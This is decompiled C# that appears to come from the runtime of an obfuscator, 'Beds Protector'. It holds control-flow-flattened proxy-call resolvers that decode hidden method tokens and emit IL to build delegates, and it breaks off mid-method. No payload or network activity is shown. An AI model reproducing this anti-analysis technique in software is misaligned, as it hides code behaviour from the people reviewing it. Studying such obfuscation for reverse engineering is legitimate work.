  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogCBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogCBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 81710 - 107346 + 25636;
    MethodBase method;
    Type[] parameterTypes;
    FieldInfo fieldFromHandle;
    Type fieldType;
    Type declaringType;
    DynamicMethod dynamicMethod;
    MethodInfo methodInfo;
    do
    {
      if (num1 == 35568 - 51920 + 16360)
      {
        if (method.IsStatic)
          num1 = 50062 - 142781 + 92728;
        else
          goto label_22;
      }
      int index1;
      if (num1 == 54344 - 128860 + 74539)
      {
        ++index1;
        num1 = 24324 - 99802 + 75502;
      }
      if (num1 == 29594 + 16985 - 46569)
        return;
      ParameterInfo[] parameters;
      if (num1 == 92746 - 111500 + 18773)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 21723 + 17922 - 39625;
      }
      int metadataToken;
      if (num1 == 14384 - 12352 - 2027)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 96854 - 16994 - 79854;
      }
      if (num1 == 58054 - 118495 + 60450)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 13687 - 11024 - 2653;
      }
      if (num1 == 55855 - 119173 + 63325)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 85173 - 183879 + 98714;
      }
      if (num1 == 9105 - 49929 + 40830)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 32138 - 45193 + 13062;
      }
      if (num1 == 72914 - 2829 - 70060)
      {
        declaringType = method.DeclaringType;
        num1 = 39847 - 50337 + 10516;
      }
      if (num1 != 37728 + 6863 - 44569)
        goto label_21;
label_20:
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 76734 - 8990 - 67721;
label_21:
      if (num1 != 90700 - 123909 + 33220)
        goto label_23;
label_22:
      dynamicMethod = (DynamicMethod) null;
      num1 = 94685 - 166838 + 72165;
label_23:
      byte[] numArray;
      int num2;
      if (num1 != 15052 - 6117 - 8914)
      {
        int index2;
        if (num1 == 96011 - 8061 - 87936)
        {
          index2 = 0;
          num1 = 9676 + 20058 - 29719;
        }
        if (num1 != 98795 - 131239 + 32459)
        {
          if (num1 == 246 + 9793 - 10038)
          {
            fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
            num1 = 49933 - 28479 - 21452;
          }
          if (num1 == 58084 - 80964 + 22882)
          {
            numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
            num1 = 95604 - 111924 + 16323;
          }
          if (num1 == 65494 - 39558 - 25932)
          {
            int num3;
            int num4;
            int num5;
            int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num3 = num2 - 1]) << 16) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num5 = num4 - 1]) << 24);
            int num7 = num5 - 1;
            int num8 = ((int) fieldFromHandle.Name[0] ^ (int) numArray[num2 = num7 - 1]) << 0;
            metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogdBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogdBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
            num1 = 2366 + 68665 - 71026;
          }
          if (num1 != 86564 + 4148 - 90696)
            goto label_35;
        }
        else
          goto label_57;
label_34:
        MethodInfo[] methods;
        methodInfo = methods[index2];
        num1 = 50562 + 30846 - 81391;
label_35:
        if (num1 == 22579 - 31388 + 8829)
        {
          index1 = 0;
          num1 = 14849 - 68260 + 53432;
        }
        if (num1 == 35261 - 1694 - 33550)
        {
          if ((object) methodInfo.DeclaringType == (object) fieldType)
          {
            num1 = 42853 - 90897 + 48062;
          }
          else
          {
            ++index2;
            goto label_57;
          }
        }
        if (num1 == 62127 - 158588 + 96474)
        {
          methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
          num1 = 87461 - 159834 + 72387;
        }
        if (num1 == 16332 - 3222 - 13098)
        {
          parameterTypes = (Type[]) null;
          num1 = 71613 - 165996 + 94396;
        }
        if (num1 != 61397 + 3787 - 65160)
          goto label_47;
        else
          goto label_45;
label_57:
        if (index2 < methods.Length)
          goto label_34;
        else
          goto label_58;
      }
label_45:
      if (index1 >= parameterTypes.Length)
        num1 = 61433 - 156348 + 94940;
      else
        goto label_20;
label_47:
      if (num1 == 99670 - 174023 + 74371)
      {
        parameters = methodInfo.GetParameters();
        num1 = 28646 - 8608 - 20019;
      }
      if (num1 == 12622 - 11439 - 1180)
      {
        num2 = numArray.Length;
        num1 = 69450 - 162184 + 92738;
      }
      if (num1 == 82772 - 53245 - 29527)
        num1 = 77869 - 25902 - 51966;
    }
    while (num1 != 74551 - 31359 - 43166);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[4] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogdBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogdBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogDBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogDBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 25120 + 18309 - 43429;
    FieldInfo fieldFromHandle;
    DynamicMethod dynamicMethod;
    MethodInfo methodInfo;
    Type fieldType;
    Type[] parameterTypes;
    MethodBase method;
    Type declaringType;
    do
    {
      byte[] numArray;
      if (num1 == 68292 - 100529 + 32239)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 33380 + 14432 - 47809;
      }
      if (num1 != 88271 - 105178 + 16918)
        goto label_5;
label_4:
      dynamicMethod = (DynamicMethod) null;
      num1 = 38609 - 32652 - 5945;
label_5:
      if (num1 != 73691 - 35911 - 37764)
        goto label_7;
label_6:
      MethodInfo[] methods;
      int index1;
      methodInfo = methods[index1];
      num1 = 76454 - 119034 + 42597;
label_7:
      if (num1 == 71206 - 31135 - 40064)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 20360 - 52275 + 31923;
      }
      if (num1 == 64868 - 41259 - 23592)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 13193 - 81305 + 68130;
        }
        else
        {
          ++index1;
          goto label_57;
        }
      }
      if (num1 != 51774 - 116191 + 64432)
      {
        if (num1 == 87779 - 119938 + 32172)
        {
          methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
          num1 = 53370 - 139869 + 86513;
        }
        int index2;
        if (num1 == 3657 + 75820 - 79457)
        {
          index2 = 0;
          num1 = 49496 + 23582 - 73057;
        }
        ParameterInfo[] parameters;
        if (num1 == 14202 - 56030 + 41847)
        {
          parameterTypes = new Type[parameters.Length];
          num1 = 67083 + 569 - 67632;
        }
        if (num1 == 58779 + 3364 - 62125)
        {
          parameters = methodInfo.GetParameters();
          num1 = 84846 + 316 - 85143;
        }
        if (num1 == 24217 - 111154 + 86946)
        {
          fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
          num1 = 48787 - 110598 + 61821;
        }
        if (num1 != 31637 + 41512 - 73125)
          goto label_26;
label_24:
        if (index2 >= parameterTypes.Length)
          num1 = 61376 - 138000 + 76649;
        else
          goto label_38;
label_26:
        if (num1 == 55291 + 10424 - 65703)
        {
          parameterTypes = (Type[]) null;
          num1 = 53550 - 8861 - 44676;
        }
        if (num1 == 52465 - 30716 - 21741)
        {
          if (method.IsStatic)
            num1 = 50534 - 139310 + 88785;
          else
            goto label_4;
        }
        if (num1 == 26283 - 60540 + 34258)
        {
          fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
          num1 = 96800 - 84376 - 12422;
        }
        int metadataToken;
        if (num1 == 14261 - 62882 + 48626)
        {
          metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
          num1 = 47028 - 40923 - 6099;
        }
        int num2;
        if (num1 == 99567 - 42237 - 57327)
        {
          num2 = numArray.Length;
          num1 = 17635 - 79057 + 61426;
        }
        if (num1 != 99931 - 109330 + 9421)
          goto label_39;
label_38:
        parameterTypes[index2] = parameters[index2].ParameterType;
        num1 = 65197 - 94439 + 29265;
label_39:
        if (num1 == 1486 + 1928 - 3391)
        {
          ++index2;
          num1 = 17449 - 9148 - 8277;
        }
        if (num1 == 63402 - 139483 + 76087)
        {
          method = fieldFromHandle.Module.ResolveMethod(metadataToken);
          num1 = 98161 - 62523 - 35631;
        }
        if (num1 != 27563 - 12369 - 15173)
        {
          if (num1 == 28022 - 116692 + 88684)
          {
            index1 = 0;
            num1 = 59603 - 77095 + 17507;
          }
          if (num1 == 87348 - 28107 - 59216)
          {
            declaringType = method.DeclaringType;
            num1 = 60314 - 106453 + 46165;
          }
          if (num1 == 79363 - 140417 + 61058)
          {
            int num3;
            int num4;
            int num5;
            int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[0] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num5 = num4 - 1]) << 16);
            int num7 = num5 - 1;
            int num8 = ((int) fieldFromHandle.Name[4] ^ (int) numArray[num2 = num7 - 1]) << 24;
            metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogeBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogeBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
            num1 = 4993 - 82750 + 77762;
          }
          if (num1 == 9031 - 48634 + 39613)
            return;
          if (num1 == 30012 - 25483 - 4529)
            num1 = 21696 - 59052 + 37357;
          continue;
        }
        goto label_24;
      }
label_57:
      if (index1 < methods.Length)
        goto label_6;
      else
        goto label_58;
    }
    while (num1 != 46253 - 40517 - 5710);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[2] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogeBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogeBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogEBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogEBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 18539 + 8210 - 26749;
    FieldInfo fieldFromHandle;
    DynamicMethod dynamicMethod;
    MethodInfo methodInfo;
    Type fieldType;
    MethodBase method;
    Type declaringType;
    Type[] parameterTypes;
    do
    {
      MethodInfo[] methods;
      if (num1 == 55263 + 40581 - 95831)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 85883 - 72849 - 13020;
      }
      if (num1 != 49061 - 25966 - 23080)
      {
        if (num1 != 74572 - 24721 - 49840)
          goto label_6;
      }
      else
        goto label_57;
label_5:
      dynamicMethod = (DynamicMethod) null;
      num1 = 37410 - 87700 + 50302;
label_6:
      byte[] numArray;
      if (num1 == 61598 - 141365 + 79769)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 19365 + 33214 - 52576;
      }
      int index1;
      if (num1 == 12978 - 57718 + 44757)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 21858 - 10466 - 11374;
        }
        else
        {
          ++index1;
          goto label_57;
        }
      }
      if (num1 == 40455 - 64340 + 23910)
      {
        declaringType = method.DeclaringType;
        num1 = 34309 - 86829 + 52546;
      }
      if (num1 != 81931 - 15203 - 66712)
        goto label_15;
label_14:
      methodInfo = methods[index1];
      num1 = 26592 - 107112 + 80537;
label_15:
      if (num1 == 50221 + 32388 - 82608)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 24394 + 43110 - 67502;
      }
      ParameterInfo[] parameters;
      if (num1 == 57 + 87517 - 87556)
      {
        parameters = methodInfo.GetParameters();
        num1 = 55408 - 5889 - 49500;
      }
      int num2;
      int metadataToken;
      if (num1 == 46979 - 34242 - 12733)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[0] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num4 = num3 - 1]) << 24) + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num5 = num4 - 1]) << 16);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[4] ^ (int) numArray[num2 = num7 - 1]) << 8;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogfBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogfBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 43254 - 107696 + 64447;
      }
      if (num1 == 20771 + 68263 - 89027)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 11706 - 59342 + 47644;
      }
      int index2;
      if (num1 == 20674 + 37507 - 58158)
      {
        ++index2;
        num1 = 97293 - 125792 + 28523;
      }
      if (num1 == 12817 + 83589 - 96386)
      {
        index2 = 0;
        num1 = 99232 - 69711 - 29500;
      }
      if (num1 != 69968 - 88471 + 18527)
        goto label_30;
label_28:
      if (index2 >= parameterTypes.Length)
        num1 = 77254 - 72012 - 5217;
      else
        goto label_33;
label_30:
      if (num1 == 23817 - 48346 + 24541)
      {
        parameterTypes = (Type[]) null;
        num1 = 74409 - 131440 + 57044;
      }
      if (num1 != 10453 + 39812 - 50243)
        goto label_34;
label_33:
      parameterTypes[index2] = parameters[index2].ParameterType;
      num1 = 2264 - 66326 + 64085;
label_34:
      if (num1 == 91509 - 80875 - 10624)
        return;
      if (num1 == 9344 - 62702 + 53363)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 59032 - 70631 + 11605;
      }
      if (num1 != 53114 - 46553 - 6540)
      {
        if (num1 == 45920 - 138772 + 92860)
        {
          if (method.IsStatic)
            num1 = 83810 - 88220 + 4419;
          else
            goto label_5;
        }
        if (num1 == 23103 - 76027 + 52933)
        {
          fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
          num1 = 1113 - 17905 + 16802;
        }
        if (num1 == 78280 - 154951 + 76677)
        {
          method = fieldFromHandle.Module.ResolveMethod(metadataToken);
          num1 = 47850 + 32301 - 80144;
        }
        if (num1 == 45392 + 18875 - 64264)
        {
          num2 = numArray.Length;
          num1 = 11666 - 55780 + 44118;
        }
        if (num1 == 51854 - 65062 + 13227)
        {
          parameterTypes = new Type[parameters.Length];
          num1 = 26665 + 12936 - 39581;
        }
        if (num1 == 50504 - 115880 + 65390)
        {
          index1 = 0;
          num1 = 47205 - 114509 + 67319;
        }
        if (num1 == 71224 - 38432 - 32792)
          num1 = 36301 + 6205 - 42505;
        continue;
      }
      goto label_28;
label_57:
      if (index1 < methods.Length)
        goto label_14;
      else
        goto label_58;
    }
    while (num1 != 53927 - 21159 - 32742);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[1] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogfBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogfBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogFBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogFBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 36561 - 127055 + 90494;
    FieldInfo fieldFromHandle;
    MethodInfo methodInfo;
    Type fieldType;
    MethodBase method;
    Type declaringType;
    DynamicMethod dynamicMethod;
    Type[] parameterTypes;
    do
    {
      MethodInfo[] methods;
      if (num1 == 5110 + 34928 - 40025)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 26395 - 64662 + 38281;
      }
      byte[] numArray;
      int num2;
      if (num1 == 38772 - 15670 - 23099)
      {
        num2 = numArray.Length;
        num1 = 48742 - 25633 - 23105;
      }
      if (num1 == 91191 - 49388 - 41802)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 13351 - 14250 + 901;
      }
      int index1;
      if (num1 == 51411 - 26414 - 24980)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 9357 - 9361 + 22;
        }
        else
        {
          ++index1;
          goto label_57;
        }
      }
      if (num1 == 47352 - 24195 - 23143)
      {
        index1 = 0;
        num1 = 21758 - 81422 + 59679;
      }
      int metadataToken;
      if (num1 == 72663 + 11375 - 84032)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 22733 - 23208 + 482;
      }
      if (num1 == 99556 - 7327 - 92221)
      {
        if (method.IsStatic)
          num1 = 27108 - 5008 - 22091;
        else
          goto label_31;
      }
      if (num1 != 31538 + 44220 - 75743)
      {
        if (num1 == 56924 + 703 - 57620)
        {
          fieldType = fieldFromHandle.FieldType;
          num1 = 31841 - 81510 + 49677;
        }
        if (num1 == 65514 - 5773 - 59736)
        {
          metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
          num1 = 40002 - 91684 + 51688;
        }
        if (num1 == 61401 + 15137 - 76513)
        {
          declaringType = method.DeclaringType;
          num1 = 63419 - 46730 - 16663;
        }
        if (num1 != 39072 - 71215 + 32159)
          goto label_26;
      }
      else
        goto label_57;
label_25:
      methodInfo = methods[index1];
      num1 = 41320 - 14803 - 26500;
label_26:
      if (num1 == 13963 + 8680 - 22641)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 2888 - 41480 + 38595;
      }
      if (num1 == 73386 + 24279 - 97655)
        return;
      if (num1 != 2058 - 32180 + 30143)
      {
